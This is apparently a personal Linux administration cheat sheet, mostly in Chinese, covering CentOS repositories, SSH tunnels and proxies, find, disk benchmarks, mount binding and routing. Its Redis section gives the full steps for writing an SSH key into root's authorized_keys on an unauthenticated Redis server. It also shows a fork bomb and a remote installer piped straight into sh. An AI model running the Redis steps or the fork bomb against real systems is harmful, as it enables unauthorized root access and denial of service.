centos rpm useful :
1.The ELRepo Project focuses on hardware related packages to enhance your experience with Enterprise Linux. This includes filesystem drivers, graphics drivers, network drivers, sound drivers, webcam and video drivers 同时也提供了正对centos5,6的long-term support kernels,以及cnetos6,7的 the latest stable mainline kernels.(kernel-lt and kernel-ml)
rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm (external link)
rpm -Uvh http://www.elrepo.org/elrepo-release-6-8.el6.elrepo.noarch.rpm (external link)
2.Extra Packages for Enterprise Linux (or EPEL) is a Fedora Special Interest Group that creates, maintains, and manages a high quality set of additional packages for Enterprise Linux
rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm
3.IUS Community Repo提供『最新版的上游 PHP、Python、MySQL 
rpm -Uvh https://centos7.iuscommunity.org/ius-release.rpm
rpm -Uvh https://centos6.iuscommunity.org/ius-release.rpm
4.The Remi's RPM Providing the  latest versions of the PHP stack, full featured, and some other software
rpm -Uvh https://rpms.remirepo.net/enterprise/remi-release-7.rpm
rpm -Uvh https://rpms.remirepo.net/enterprise/remi-release-6.rpm
5.The Software Collections ( SCL ) Repository
The Software Collections SIG will provide an upstream development area for various software collections and related tools. Developers can build on and extend existing SCLs, so they don't need to re-invent the wheel or take responsibility for packaging unnecessary dependencies.
yum install centos-release-scl
too try python35 with scl:
yum install rh-python35
scl enable rh-python35
scl enable rh-python35  "python3 --help"
6.Atomic 提供nmap,nc,nginx,php,mysql
wget -q -O - http://www.atomicorp.com/installers/atomic | sh


ssh tunnels:
ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Host 
ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Host 
ssh -C -f -N -g -D listen_port user@Tunnel_Host
-L port:host:hostport 
将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport
-R port:host:hostport 
将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport
-D port 
指定一个本地机器 “动态的’’ 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS4,SOCKS5 协议, 将充当 SOCKS4,SOCKS5 服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.

通过跳板机直接连远端机器:
ssh -o "ProxyCommand ssh lmx@proxy.machine nc -w 1 %h %p" -p 1098 lmx@target.machine

ssh via proxy:
ssh -o 'ProxyCommand=nc --proxy 192.168.100.3:1080 --proxy-type socks5 %h %p' root@10.7.130.21
ssh -o 'ProxyCommand=nc --proxy 192.168.100.3:8080 --proxy-type http %h %p' root@10.7.130.21
注意安装nmap-ncat-6.47才能支持socks5


until kctl get servicemonitor > /dev/null 2>&1; do sleep 1; printf "."; done

find to exclude folders:
find -not -path "./com/ozstrategy/*' -not -path "./com/cmc/*" -type f
This command copies the contents of /source-dir to /dest-dir, but omits files and directories named .snapshot (and anything in them).  It also omits files or directories whose name ends in ~, but not their contents.  The construct -prune -o \( ... -print0 \) is quite common.  The idea here is that the expression before -prune  matches  things  which are  to  be  pruned.  However, the -prune action itself returns true, so the following -o ensures that the right hand side is evaluated only for those directories which didn't get pruned 
下面的命令找出并复制当前目录中所有非名为.snapshot，以及名字不是已～结束的文件和目录到dest-dir
find . -name .snapshot -prune -o \( \! -name *~ -print0 \)|   cpio -pmd0 /dest-dir
find . -inum id -exec rm {} -rf \;	#通过innode删除文件
rm -- -test #删除-开头文件

设置一个文件的修改时间为epoch，On GNU and POSIX systems,the epoch is 1970-01-01 00:00:00 UTC, so '@0' represents this time，'@1' represents 1970-01-01 00:00:01 UTC
touch -d "@0" file

获取文件修改时间到现在的秒数time of last modification, seconds since Epoch
stat --format "%Y" file


test disk speed:
measure server write speed
dd if=/dev/zero of=/tmp/test1.img bs=1G count=1 oflag=dsync
measure server latency 
dd if=/dev/zero of=/tmp/test2.img bs=512 count=1000 oflag=dsync
measure server read speed
echo 3 > /proc/sys/vm/drop_caches &&time dd if=/path/to/bigfile of=/dev/null bs=8k

Use hdparm command to see buffered and cached disk read speed
## Cache read benchmark for /dev/sda ###
hdparm -T /dev/sda1
### Buffered disk read test for /dev/sda ##
hdparm -t /dev/sda1


hard link 不能跨硬盘的问题可以通过mount --bind 解决,同时mount --bind只会暂时隐藏目标文件的内容，在umount还会恢复原内容。

一个mount目录可以有以下几种状态:
 Mount states
	A given mount can be in one of the following states
	1) shared 
mount --make-shared /mnt  
mount --bind /mnt /tmp
The mount at /mnt and that at /tmp are both shared and belong to the same peer group. Anything mounted or unmounted under /mnt or /tmp reflect in all the other mounts of its peer group.
	2) slave
	3) shared and slave
	4) private
	5) unbindable

redis如果未开启验证则可能被通过save dbfilename来写入文件到机器
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n")|redis-cli -h 192.168.1.11 -x set crack 
$ 192.168.1.11:6379> config set dir /root/.ssh/
$ 192.168.1.11:6379> config get dir
1) "dir"
2) "/root/.ssh"
$ 192.168.1.11:6379> config set dbfilename "authorized_keys"
$ 192.168.1.11:6379> save

ssh log:
SyslogFacility AUTHPRIV

command -v cmd #返回cmd命令的绝对路径


在连接vpn时候，如果想要所有流量走vpn那么可以添加两个0.0.0.0/1和128.0.0.0/1路由从vpn出去来包含所有的IP，以便vpn连接存在时不会使用默认的0.0.0.0/0路由


 systemd-tmpfiles-clean 服务用来定期清理文件，默认会清理/tmp目录，它由systemd-tmpfiles-clean.timer调用执行，配置文件在/usr/lib/tmpfiles.d/


在bash程序中使用/dev/tcp/ip/port的方式就可以创建一个scoket作为客户端去连接服务端的ip:port

.(){ .|.& };.
.(){}的意思是，定义一个函数名子叫“.”。虽然系统中又个内建命令也叫.，就是source命令，但是我们也知道，当函数和内建命令名字冲突的时候，bash首先会将名字当成是函数来解释。在{}包含的函数体中，使用了一个管道连接了两个点，这里的第一个.就是函数的递归调用，我们也知道了使用管道的时候会打开一个subshell的子进程，所以在这里面就递归的打开了子进程。{}后面的分号只表示函数定义完毕的结束符，在之后就是调用函数名执行的.，之后函数开始递归的打开自己，去产生子进程，直到系统崩溃为止。
cat|bash

bash会在以下情况下打开一个subshell执行命令：
使用&作为命令结束提交了作业控制任务时。
使用|连接的命令会在subshell中打开。
使用()封装的命令。
使用coproc（bash 4.0版本之后支持）作为前缀执行的命令。
要执行的文件不存在或者文件存在但不具备可执行权限的时候，这个执行过程会打开一个subshell执行。
subshell中的$$取到的仍然是父进程bash的pid，如果想要取到subshell的pid，可以使用BASHPID变量

lid -g groupname 显示group中的所有用户


ip route add xxxx/x dev eth0 via 10.0.0.3
The "via 10.0.0.3" only has an effect on Ethernet networks. Ethernet doesn't know about IPv4 or IPv6, it only knows about MAC addresses. What "via 10.0.0.3" does is that when it has to send a packet to 8.8.8.8, it sets the IPv4 header's destination address to 8.8.8.8, but it sets the Ethernet header's destination address to the MAC address of the host which has the address 10.0.0.3. It figured out the last part by doing ARP resolution.

pm2:  Production process manager for Node.JS applications
nmp install pm2
pm2 start|list|restart

tcpdump将内存保存在远端机器
tcpdump -i eth0 -s 65535 -x -n -q -tttt 'port 3306 and tcp[1] & 7 == 2 and tcp[3] & 7 == 2' 2>/dev/null | ssh $REMOTEHOST -- "cat - > $TMP/$TMPfile" &

#记录用户登录后操作记录
echo '/usr/bin/script -qaf /root/$USER-$UIDO-`date +%Y%m%d%H%M`.log' >>/root/.bash_profile


主机系统目录误操作权限修改为 777 的修复方法
通过一台权限正常的Linux（最好内核版本和故障服务器相同） 通过 getfacl -R / >systemp.bak 
在异常服务器中执行setfacl --restore=systemp.bak

